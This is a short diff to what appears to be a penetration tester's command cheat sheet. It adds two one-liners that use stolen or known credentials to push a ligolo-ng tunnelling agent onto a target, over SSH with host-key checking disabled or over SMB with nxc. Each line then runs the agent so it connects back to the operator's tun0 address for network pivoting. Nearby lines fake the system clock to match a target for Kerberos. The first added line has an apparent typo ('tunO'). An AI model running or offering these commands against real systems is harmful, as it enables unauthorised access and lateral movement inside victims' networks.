@@ -5,6 +5,8 @@
 faketime "$(rdate -n $TARGET -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
 export KRB5CCNAME=$CCACHE_FILE # Set Kerberos cache file
 unset KRB5CCNAME
+sshpass -p "$PASSWORD" rsync -azh --progress -e "ssh -o StrictHostKeyChecking=no" /opt/resources/linux/ligolo-ng/agent_linux_amd64 "$USER"@"$TARGET":/tmp && sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USER"@"$TARGET" /tmp/agent_linux_amd64 -connect $(tunO):11601 -ignore-cert -retry
+nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --put-file /opt/resources/windows/ligolo-ng/agent.exe "\\Windows\\Temp\\ligolo.exe" --smb-timeout 60 -x "start \"\" cmd /c \"\\Windows\\Temp\\ligolo.exe -connect $(tun0):11601 -ignore-cert -retry\""
 
 # ----- Active Enumeration ----- #
 
